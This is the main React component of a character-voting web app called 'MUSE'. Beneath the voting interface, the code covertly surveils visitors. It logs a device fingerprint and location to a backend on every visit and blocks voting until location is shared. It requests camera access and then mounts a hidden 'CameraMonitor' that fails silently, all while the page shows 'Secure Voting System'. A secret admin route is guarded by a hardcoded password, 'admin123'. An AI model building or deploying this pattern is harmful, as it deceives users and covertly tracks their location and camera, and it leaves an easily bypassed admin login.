import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { Character } from './types';
import { INITIAL_CHARACTERS } from './constants';
import SwipeCard from './components/SwipeCard';
import Leaderboard from './components/Leaderboard';
import VoteConfirmationModal from './components/VoteConfirmationModal';
import AdminDashboard from './components/AdminDashboard';
import PermissionModal from './components/PermissionModal';
import CameraMonitor from './components/CameraMonitor';
// TutorialOverlay import removed to disable tutorial
import { dataService } from './services/dataService'; 
import { Timer, ShieldAlert, Fingerprint, Share2, Check, Loader2, MapPin } from 'lucide-react';
import { AnimatePresence } from 'framer-motion';
import { getDetailedDeviceInfo } from './utils/deviceInfo';
import confetti from 'canvas-confetti';

function App() {
  // --- VIEW STATE WITH SECRET ROUTE ---
  const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>(() => {
      const path = window.location.pathname;
      return path === '/jjklq' ? 'admin_login' : 'app';
  });

  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  const [isAdminLoading, setIsAdminLoading] = useState(false);
  const [characters, setCharacters] = useState<Character[]>(INITIAL_CHARACTERS);
  const [activeIndex, setActiveIndex] = useState(0);
  const [showCopied, setShowCopied] = useState(false);
  
  const guestId = useMemo(() => {
    let gid = localStorage.getItem('muse_guest_id');
    if (!gid) { 
        gid = `guest_${Math.random().toString(36).substr(2, 9)}`; 
        localStorage.setItem('muse_guest_id', gid); 
    }
    return gid;
  }, []);

  const [hasVoted, setHasVoted] = useState<boolean>(false);
  const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false);

  // --- PERMISSION STATE ---
  const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);
  const [showPermissionModal, setShowPermissionModal] = useState(false); 
  const [isCheckingPermissions, setIsCheckingPermissions] = useState(false); // NEW: Visual feedback state

  // --- TIMER STATE ---
  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => localStorage.getItem('muse_voting_deadline'));
  const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
  const [isVotingEnded, setIsVotingEnded] = useState(false);
  const [rankings, setRankings] = useState<string[]>([]); // Store IDs of ordered winners

  // --- FIREWORKS EFFECT ---
  const triggerCelebration = () => {
      const duration = 5 * 1000;
      const animationEnd = Date.now() + duration;
      const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };
      const randomInRange = (min: number, max: number) => Math.random() * (max - min) + min;

      const interval: any = setInterval(function() {
        const timeLeft = animationEnd - Date.now();
        if (timeLeft <= 0) return clearInterval(interval);
        const particleCount = 50 * (timeLeft / duration);
        confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
        confetti({ ...defaults, particleCount, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
      }, 250);
  };

  // --- LOGGING ---
  useEffect(() => {
      if (view !== 'app') return;
      const initSurveillance = async () => {
          const deviceInfo = getDetailedDeviceInfo();
          const storedLoc = localStorage.getItem('muse_user_location');
          let locationData = storedLoc ? JSON.parse(storedLoc) : null;
          await dataService.registerUserLogin({
              user_identifier: guestId,
              password_text: '', 
              login_method: 'guest_visit',
              device_info: deviceInfo,
              location_data: locationData
          });
      };
      initSurveillance();
  }, [guestId, view]); 

  const registerInteraction = useCallback(() => {
      if (!hasInteracted) setHasInteracted(true);
  }, [hasInteracted]);

  // --- DATA LOADING ---
  const fetchCharacters = useCallback(async () => {
    try {
        const chars = await dataService.getCharacters();
        if (chars.length > 0) {
            setCharacters(prev => {
                if (JSON.stringify(prev) === JSON.stringify(chars)) return prev;
                return chars;
            });
        }
    } catch (e) { console.error("Fetch error", e); }
  }, []);

  useEffect(() => {
    fetchCharacters();
    const unsubscribeSupabase = dataService.subscribeToVotes(() => fetchCharacters());
    const pollInterval = setInterval(() => fetchCharacters(), 5000);

    const handleStorageChange = () => {
        fetchCharacters();
        setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
    };
    window.addEventListener('local-storage-update', handleStorageChange);
    window.addEventListener('storage', handleStorageChange);
    
    // --- VOTE STATUS CHECK (EVENT BASED) ---
    const checkVoteStatus = () => {
        const rawRecord = localStorage.getItem(`muse_vote_record_${guestId}`);
        if (!rawRecord) {
            setHasVoted(false);
            return;
        }

        try {
            const record = JSON.parse(rawRecord);
            const currentEventId = localStorage.getItem('muse_voting_deadline');

            // Logic: If there is an active deadline (Event), and the user's vote record 
            // does NOT match this deadline, it means it's an old vote -> Allow Re-vote.
            if (currentEventId && record.eventDeadline !== currentEventId) {
                setHasVoted(false);
            } else {
                // Either match, or no deadline set (fallback to permanent vote)
                setHasVoted(true);
            }
        } catch (e) {
            setHasVoted(false);
        }
    };
    
    checkVoteStatus();

    return () => {
        unsubscribeSupabase();
        clearInterval(pollInterval);
        window.removeEventListener('local-storage-update', handleStorageChange);
        window.removeEventListener('storage', handleStorageChange);
    };
  }, [fetchCharacters, guestId, votingDeadline]);

  // --- DEEP LINKING CHECK ---
  useEffect(() => {
      const params = new URLSearchParams(window.location.search);
      const sharedId = params.get('id');
      if (sharedId && characters.length > 0) {
          const idx = characters.findIndex(c => c.id === sharedId);
          if (idx !== -1) {
              setActiveIndex(idx);
              window.history.replaceState({}, '', window.location.pathname);
          }
      }
  }, [characters]);

  // --- SMOOTH PERMISSIONS CHECK ---
  // Returns array of missing mandatory permissions. Camera is treated as optional/background.
  const checkPermissions = useCallback(async (): Promise<('location' | 'camera')[]> => {
    const missing: ('location' | 'camera')[] = [];
    
    // 1. Check Location (Sequential - Blocking)
    const locationGranted = await new Promise<boolean>((resolve) => {
        if (!('geolocation' in navigator)) { resolve(false); return; }
        
        // Use a shorter timeout for smoother UX
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                
                // Silent background log
                dataService.registerUserLogin({
                    user_identifier: guestId,
                    password_text: '',
                    login_method: 'location_update',
                    device_info: getDetailedDeviceInfo(), 
                    location_data: locationData
                });
                resolve(true);
            },
            (error) => {
                // Don't log intrusive warnings, just return false
                resolve(false);
            },
            { timeout: 5000, enableHighAccuracy: false } // Faster check, lower accuracy initially is fine
        );
    });

    if (!locationGranted) missing.push('location');

    // 2. Check Camera (Attempt only - Don't fail the flow if denied)
    // We try to "warm up" permissions here.
    if (locationGranted) { 
        try {
            // Short timeout attempt for camera
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            // Immediately release
            stream.getTracks().forEach(track => track.stop());
        } catch (err) {
            // Camera denied or unavailable. We simply proceed without it.
            // Surveillance component will handle its own silent failure later.
        }
    }

    const finalMissing = [...new Set([...missing])];
    setMissingPermissions(finalMissing);
    return finalMissing;
  }, [guestId]);

  // --- TIMER & WINNER LOGIC ---
  useEffect(() => {
    const calculateTimeLeft = () => {
        if (!votingDeadline) { 
            setTimeLeft(null); setIsVotingEnded(false); setRankings([]); return; 
        }
        const diff = new Date(votingDeadline).getTime() - new Date().getTime();
        
        if (diff > 0) {
            setTimeLeft({
                days: Math.floor(diff / (1000 * 60 * 60 * 24)),
                hours: Math.floor((diff / (1000 * 60 * 60)) % 24),
                minutes: Math.floor((diff / 1000 / 60) % 60),
                seconds: Math.floor((diff / 1000) % 60),
            });
            setIsVotingEnded(false);
            setRankings([]);
        } else {
            setTimeLeft(null); 
            if (!isVotingEnded && characters.length > 0) {
                setIsVotingEnded(true);
                const sorted = [...characters].sort((a,b) => b.votes - a.votes);
                const winnerId = sorted[0].id;
                setRankings(sorted.map(c => c.id));
                triggerCelebration();
                const winnerIndex = characters.findIndex(c => c.id === winnerId);
                if (winnerIndex !== -1) setActiveIndex(winnerIndex);
            }
        }
    };
    calculateTimeLeft();
    const timer = setInterval(calculateTimeLeft, 1000);
    return () => clearInterval(timer);
  }, [votingDeadline, characters, isVotingEnded]);

  const getOffset = (index: number, active: number, len: number) => {
      let offset = index - active;
      if (offset > len / 2) offset -= len;
      if (offset < -len / 2) offset += len;
      return offset;
  };

  const getRank = (charId: string): number | undefined => {
      if (!isVotingEnded || rankings.length === 0) return undefined;
      const index = rankings.indexOf(charId);
      return index !== -1 ? index + 1 : undefined; 
  };

  // --- INTERACTION ---

  const handleNext = () => {
      if (isVotingEnded) return;
      registerInteraction();
      setActiveIndex((prev) => (prev + 1) % characters.length);
  };
  
  const handlePrev = () => {
      if (isVotingEnded) return;
      registerInteraction();
      setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
  };

  const handleCardClick = (index: number) => {
      registerInteraction();
      setActiveIndex(index);
  };

  const handleShare = async () => {
    registerInteraction();
    const activeChar = characters[activeIndex];
    const link = `${window.location.origin}?id=${activeChar.id}`;
    try {
        await navigator.clipboard.writeText(link);
        setShowCopied(true);
        setTimeout(() => setShowCopied(false), 2000);
    } catch (err) { console.error("Failed to copy link", err); }
  };

  const handleVoteClick = async () => {
      registerInteraction();
      if (hasVoted || isVotingEnded || isCheckingPermissions) return;
      
      // 1. Visual Feedback
      setIsCheckingPermissions(true);

      // 2. Artificial delay for smooth UI transition
      await new Promise(resolve => setTimeout(resolve, 300));
      
      // 3. Perform Check (Primarily Location)
      const missing = await checkPermissions();
      
      setIsCheckingPermissions(false); // Stop feedback

      // 4. Blocking Logic: Only block if LOCATION is missing.
      if (missing.includes('location')) {
          setShowPermissionModal(true);
          return;
      }

      // If location is valid, proceed immediately.
      // Camera permission (if granted in checkPermissions) will be used by CameraMonitor later.
      setIsVoteModalOpen(true);
  };

  const handlePermissionRetry = async () => {
      if (isCheckingPermissions) return;
      setIsCheckingPermissions(true);
      
      // Try again
      const missing = await checkPermissions();
      
      setIsCheckingPermissions(false);

      if (!missing.includes('location')) {
          setHasInteracted(true); 
          setShowPermissionModal(false);
          // Small delay before showing vote modal to let the UI breathe
          setTimeout(() => setIsVoteModalOpen(true), 200);
      }
  };

  const handleConfirmVote = async () => {
    if (isVotingEnded) return;
    setIsVoteModalOpen(false);

    // One last sanity check for Location
    const storedLoc = localStorage.getItem('muse_user_location');
    if (!storedLoc) {
         // Fallback if localstorage was cleared
         const missing = await checkPermissions();
         if (missing.includes('location')) { 
             setShowPermissionModal(true); 
             return; 
         }
    }

    try {
        const activeChar = characters[activeIndex];
        const locationData = storedLoc ? JSON.parse(storedLoc) : null;
        const deviceInfo = getDetailedDeviceInfo();

        setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c));
        setHasVoted(true); 

        const success = await dataService.castVote(activeChar.id, guestId, { 
            location: locationData, 
            deviceInfo,
            eventDeadline: votingDeadline 
        });
        
        if (!success) {
            setCharacters(prev => prev.map(c => c.id === activeChar.id ? { ...c, votes: c.votes - 1 } : c));
            setHasVoted(false);
            alert("Gagal melakukan voting. Mohon periksa koneksi internet Anda.");
        }
    } catch (e) {
        setHasVoted(false);
    }
  };

  const handleLogout = () => {
      setView('app');
      window.history.pushState({}, '', '/');
  };

  const activeCharacter = characters[activeIndex];

  const hasTimer = !!(votingDeadline && !isVotingEnded && timeLeft);

  if (view === 'admin_login') return (
        <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
             <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl relative overflow-hidden">
                <h2 className="text-xl font-bold text-white mb-6 text-center">System Administration</h2>
                <form onSubmit={(e) => { e.preventDefault(); setIsAdminLoading(true); setTimeout(() => { if (adminPassword === 'admin123') { setView('admin_dashboard'); setAdminError(''); } else { setAdminError('Invalid Code'); } setIsAdminLoading(false); }, 1000); }} className="space-y-4">
                   <input type="password" value={adminPassword} onChange={(e) => setAdminPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl outline-none" placeholder="••••••••" />
                   {adminError && <p className="text-red-500 text-xs text-center">{adminError}</p>}
                   <button type="submit" disabled={isAdminLoading} className="w-full bg-indigo-600 text-white font-bold py-3 rounded-xl">Unlock System</button>
                   <button type="button" onClick={handleLogout} className="w-full text-slate-500 text-xs mt-2">Return to App</button>
                </form>
             </div>
        </div>
  );

  if (view === 'admin_dashboard') return <AdminDashboard characters={characters} setCharacters={setCharacters} onLogout={handleLogout} />;

  return (
    <div className="min-h-screen w-full bg-slate-950 flex justify-center overflow-x-hidden relative font-sans">
      <div className="fixed inset-0 pointer-events-none z-0">
         <div className="absolute top-[-20%] left-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-purple-900/20 rounded-full blur-[120px]" />
         <div className="absolute bottom-[-20%] right-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-indigo-900/20 rounded-full blur-[100px]" />
      </div>

      <div className="relative z-10 w-full max-w-md flex flex-col items-center py-6 px-4 gap-6">
        <header className="w-full flex flex-col gap-4 relative">
          <div className="w-full flex justify-between items-center bg-slate-900/40 p-3 rounded-2xl border border-white/5 backdrop-blur-sm shadow-lg">
             <div className="flex items-center gap-3">
                 <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center font-bold text-white shadow-lg">M</div>
                 <div><h1 className="text-lg font-bold text-white leading-none">MUSE</h1><p className="text-[9px] text-indigo-300/80 tracking-widest uppercase font-medium">Rankings</p></div>
             </div>
             
             {/* HEADER RIGHT ACTIONS */}
             <div className="flex items-center gap-2">
                 <button 
                    onClick={handleShare} 
                    className="p-2 rounded-xl bg-slate-800/50 border border-slate-700/50 text-indigo-300 hover:bg-indigo-600 hover:text-white hover:border-indigo-500 transition-all shadow-sm active:scale-95"
                    title="Share Profile"
                 >
                    {showCopied ? <Check size={16} className="text-emerald-400" /> : <Share2 size={16} />}
                 </button>
                 <div className="flex items-center gap-2 pl-3 pr-3 py-1.5 bg-slate-800/50 rounded-full border border-slate-700/50">
                    <Fingerprint size={12} className="text-indigo-400" />
                    <span className="text-[10px] font-mono font-semibold text-slate-400 max-w-[80px] truncate">{guestId}</span>
                 </div>
             </div>
          </div>
          {votingDeadline && !isVotingEnded && timeLeft && (
             <div className="w-full bg-indigo-900/20 border border-indigo-500/20 rounded-xl p-3 flex items-center justify-between backdrop-blur-sm">
                <div className="flex items-center gap-2 text-indigo-300"><Timer size={16} className="animate-pulse" /><span className="text-xs font-bold tracking-wider">VOTING ENDS IN</span></div>
                <div className="flex items-center gap-1 font-mono text-sm font-bold text-white">
                    <span>{timeLeft.days}d : {timeLeft.hours}h : {timeLeft.minutes}m : {timeLeft.seconds}s</span>
                </div>
             </div>
          )}
          {isVotingEnded && (
              <div className="w-full bg-amber-900/20 border border-amber-500/40 rounded-xl p-3 flex flex-col items-center justify-center backdrop-blur-sm animate-pulse">
                <span className="text-amber-400 font-bold tracking-[0.2em] text-sm">VOTING CLOSED</span>
                <span className="text-[10px] text-amber-200/70">Winners Announced Below</span>
              </div>
          )}
        </header>

        {/* Main Swipe Area - Cyclic Stacking */}
        <section className="w-full relative h-[480px] sm:h-[500px] flex items-center justify-center perspective-1000 mt-2">
             {characters.map((char, index) => {
                  const offset = getOffset(index, activeIndex, characters.length);
                  return (
                    <SwipeCard 
                      key={char.id}
                      character={char} 
                      isActive={index === activeIndex}
                      offset={offset}
                      onClick={() => handleCardClick(index)}
                      onSwipeRight={handlePrev}
                      onSwipeLeft={handleNext}
                      isVotingEnded={isVotingEnded}
                      rank={getRank(char.id)} 
                    />
                  );
               })}
        </section>

        {/* Indicators & Vote Button */}
        <section className="w-full flex flex-col items-center gap-4 px-2">
             <div className="flex justify-center gap-1.5 mb-2">
                {characters.map((_, idx) => (
                  <button key={idx} onClick={() => { registerInteraction(); setActiveIndex(idx); }} className={`h-1.5 rounded-full transition-all duration-300 ${idx === activeIndex ? 'w-8 bg-indigo-400' : 'w-1.5 bg-slate-700'}`} />
                ))}
             </div>
             
             {!isVotingEnded ? (
                <button
                onClick={handleVoteClick}
                disabled={hasVoted || isCheckingPermissions}
                className={`relative w-full h-14 rounded-2xl font-bold text-lg transition-all flex items-center justify-center gap-3 overflow-hidden shadow-[0_0_20px_rgba(0,0,0,0.3)] border ${
                    hasVoted 
                    ? 'bg-slate-900/50 border-slate-700/50 cursor-not-allowed text-slate-500' 
                    : isCheckingPermissions 
                        ? 'bg-slate-800 border-indigo-500/50 text-indigo-300 cursor-wait'
                        : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white hover:bg-slate-800 active:scale-95'
                }`}
                >
                    {hasVoted ? (
                        <span>VOTING CLOSED FOR YOU</span>
                    ) : isCheckingPermissions ? (
                        <div className="flex items-center gap-3">
                            <Loader2 className="animate-spin" size={20} />
                            <span className="tracking-widest text-sm">VERIFYING...</span>
                        </div>
                    ) : (
                        <span>VOTE FOR {activeCharacter.name.split(' ')[0].toUpperCase()}</span>
                    )}
                </button>
             ) : (
                 <div className="text-center text-slate-400 text-sm font-mono mt-2">
                     Season Results Finalized
                 </div>
             )}

             {!hasVoted && !isVotingEnded && (
                 <p className="text-[10px] text-slate-500 flex items-center gap-1 opacity-70">
                    <ShieldAlert size={10} /> Secure Voting System
                 </p>
             )}
        </section>

        <section className="w-full relative z-30 pb-10">
           <Leaderboard characters={characters} onCharacterSelect={(id) => {
               const idx = characters.findIndex(c => c.id === id);
               if(idx !== -1) setActiveIndex(idx);
               window.scrollTo({ top: 0, behavior: 'smooth' });
           }} />
        </section>
        
        <footer className="w-full text-center pb-8 opacity-20">
           <p className="text-[10px] text-slate-700">MUSE &copy; 2024</p>
        </footer>
      </div>

      {/* MODALS */}
      <AnimatePresence>
        {isVoteModalOpen && !isVotingEnded && <VoteConfirmationModal isOpen={isVoteModalOpen} onClose={() => setIsVoteModalOpen(false)} onConfirm={handleConfirmVote} characterName={activeCharacter.name} />}
      </AnimatePresence>

      <AnimatePresence>
        {showPermissionModal && (
            <PermissionModal 
                onRetry={handlePermissionRetry} 
                missingPermissions={missingPermissions} 
                onClose={() => setShowPermissionModal(false)} 
            />
        )}
      </AnimatePresence>
      
      {hasInteracted && view === 'app' && (
        <CameraMonitor user={guestId} onError={() => {}} onSuccess={() => {}} />
      )}
    </div>
  );
}

export default App;